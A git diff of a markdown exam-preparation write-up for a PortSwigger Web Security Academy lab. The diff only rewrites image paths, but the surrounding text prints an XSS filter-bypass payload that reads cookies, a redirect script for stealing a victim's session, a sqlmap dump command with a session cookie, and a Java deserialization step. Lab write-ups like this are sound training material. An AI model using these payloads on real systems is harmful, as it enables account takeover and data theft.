@@ -42,7 +42,7 @@ XSS can be used to steal cookies of other users, then we need to try :
 
 But no luck : 
 
-![XSS blocked.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/XSS_blocked.png)
+![XSS blocked.png](/assets/images/burp/XSS_blocked.png)
 
 We need to find a bypass and I found on the internet that we can bypass it by using : 
 
@@ -50,7 +50,7 @@ We need to find a bypass and I found on the internet that we can bypass it by us
 \\"-alert(window["document"]["cookie"])}//
 ```
 
-![XSS Bypassed.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/XSS_Bypassed.png)
+![XSS Bypassed.png](/assets/images/burp/XSS_Bypassed.png)
 
 Now that we have the good payload we have to construct a payload with the exploit server link :
 
@@ -64,7 +64,7 @@ location='https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/?Sea
 </script>
 ```
 
-![Capture d’écran 2023-02-03 à 14.05.12.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/Capture_decran_2023-02-03_a_14.05.12.png)
+![Capture d’écran 2023-02-03 à 14.05.12.png](/assets/images/burp/Capture_decran_2023-02-03_a_14.05.12.png)
 
 We just have to replace the session cookie to have access to Carlos account. 
 
@@ -72,11 +72,11 @@ We just have to replace the session cookie to have access to Carlos account.
 
 We have access to a new feature : 
 
-![AdvancedSearch.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/AdvancedSearch.png)
+![AdvancedSearch.png](/assets/images/burp/AdvancedSearch.png)
 
 We see a parameter ⇒ sorted-by vulnerable to SQLi
 
-![VulnParam.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/VulnParam.png)
+![VulnParam.png](/assets/images/burp/VulnParam.png)
 
 I launched the sqlmap command below : 
 
@@ -84,7 +84,7 @@ I launched the sqlmap command below :
 sqlmap -u "[https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/filtered_search?SearchTerm=&writer=&sort-by=DATE*](https://0a5800ae0314d4b3c09c3b3500dd000f.web-security-academy.net/filtered_search?SearchTerm=&writer=&sort-by=DATE*)" --cookie="_lab=46%7cMCwCFAuZTmvz13aVBBW1bpQM25dE2RVNAhRq8fmJk1vCl2i8uauGpq2N%2bIytqdEsQkFl0b%2b8pNzF%2f4p3No1yF19zA%2bj3GuVuecfTlUlSWFGu7SfWBmEz6Mu0JEWnJg5r4GggAibBFB9QtX0gMd%2fLhfFCfcTKNJtOaZ4mGvaUex6vw3k%3d; session=F8UksvHTO0lwQgGckaeEpePsgEJQTvs2" --dump
 ```
 
-![SQLi result.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/SQLi_result.png)
+![SQLi result.png](/assets/images/burp/SQLi_result.png)
 
 Now time to visit admin-panel and see what’s the next bug ! 
 
@@ -92,17 +92,17 @@ Now time to visit admin-panel and see what’s the next bug !
 
 Using Burp Scanner we can see that admin_pref are vulnerable :
 
-![Launch Scan.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/Launch_Scan.png)
+![Launch Scan.png](/assets/images/burp/Launch_Scan.png)
 
-![Burp Scan.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/Burp_Scan.png)
+![Burp Scan.png](/assets/images/burp/Burp_Scan.png)
 
 Using Deserialization Scanner plugin on Burp gave me these informations : 
 
-![JavaDeserialization.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/JavaDeserialization.png)
+![JavaDeserialization.png](/assets/images/burp/JavaDeserialization.png)
 
 Once the payload is generated and the request sent, we can go back to Burp Collaborator to see if we have a ping back : 
 
-![Solution.png](Burp%20Suite%20Certified%20Practitioner%20Exam%20Preparation%20e44ac319b9a043ea9b3e732055d7c4f5/Solution.png)
+![Solution.png](/assets/images/burp/Solution.png)
 
 BINGO ! We have then finished the lab. 
 
